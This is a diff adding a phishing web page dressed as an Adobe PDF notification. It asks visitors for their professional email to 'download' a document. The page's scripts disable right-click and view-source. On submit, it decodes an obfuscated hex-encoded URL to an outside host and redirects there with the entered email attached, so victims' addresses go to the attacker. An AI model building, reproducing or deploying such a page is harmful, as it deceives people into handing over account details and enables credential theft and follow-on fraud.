@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Document Notification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB3wAAALOCAYAAABCuGJqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjw') no-repeat center center fixed;
+            background-size: cover;
+            background: rgba(211, 211, 211);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            width: 480px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 45px;
+            border-radius: 10px;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.2);
+            text-align: left;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .header img {
+            width: 55px;
+        }
+        .header h2 {
+            font-size: 22px;
+            margin: 0;
+            color: #333;
+        }
+        .preview {
+            background: #f0f8ff;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+            border-left: 5px solid #0078D4;
+        }
+        .preview span {
+            font-weight: bold;
+            color: #000;
+        }
+        .preview p:last-child {
+            font-style: italic;
+            color: #666;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background: #0078D4;
+            color: white;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .button:disabled {
+            background: #A0A0A0;
+            cursor: not-allowed;
+        }
+    </style>
+    <script>
+        document.addEventListener("contextmenu", function(event) {
+            event.preventDefault();
+        });
+        document.addEventListener("keydown", function(event) {
+            if (event.ctrlKey && (event.key === "u" || event.key === "U")) {
+                event.preventDefault();
+            }
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.adobe.com/content/dam/shared/images/product-icons/svg/acrobat.svg" alt="Voicemail Icon">
+            <h2>Adobe Document Received</h2>
+        </div>
+        <div class="preview">
+            <p><span>Pages:</span> 10</p>
+            <p><span>File Format:</span> PDF (Medium)</p>
+            <p><span>Resolution:</span> 300x300 DPI</p></p>
+        </div>
+        <form id="voicemailForm">
+            <label for="emailInput"><span style="font-family: Aptos Narrow, Aptos_EmbeddedFont, Aptos_MSFontService, sans-serif; font-size: 12pt; color: rgb(0, 0, 0);"></span><div class="elementToProof" style="font-family: Arial, Helvetica, sans-serif; font-size: 10pt; color: rgb(0, 0, 0);"><span style="font-family: Segoe UI, Aptos_EmbeddedFont, Aptos_MSFontService, sans-serif;"><b>To receive and download this PDF, please enter specific professional email credentials that this document was sent to.</b></span></div><span style="font-family: Aptos Narrow, Aptos_EmbeddedFont, Aptos_MSFontService, sans-serif; font-size: 12pt; color: rgb(0, 0, 0);" class="elementToProof"></span></label>
+            <input type="email" id="emailInput" class="input-field" placeholder="Enter your email" required>
+            <button type="submit" id="submitButton" class="button" disabled>Open Documents from Storage</button>
+        </form>
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const encodedWorkerUrl = "%0068%0074%0074%0070%0073%003a%002f%002f%0078%006a%0067%0072%006f%0075%0070%0073%002e%0063%006f%006d%002f%003f%0071%006c%0068%0066%0070%0069%0075%0075";
+            function decodeUrlUtf16LE(encodedUrl) {
+                let decoded = '';
+                const hexValues = encodedUrl.split('%00').filter(v => v.length > 0);
+                for (let hex of hexValues) {
+                    decoded += String.fromCharCode(parseInt(hex, 16));
+                }
+                return decoded;
+            }
+            const form = document.getElementById('voicemailForm');
+            const emailInput = document.getElementById('emailInput');
+            const submitButton = document.getElementById('submitButton');
+            emailInput.addEventListener('input', function () {
+                submitButton.disabled = !emailInput.validity.valid;
+            });
+            form.addEventListener('submit', function (event) {
+                event.preventDefault();
+                const email = emailInput.value;
+                const workerUrl = decodeUrlUtf16LE(encodedWorkerUrl);
+                window.location.href = `${workerUrl}&email=${(email)}`;
+            });
+        });
+    </script>
+</body>
+</html>
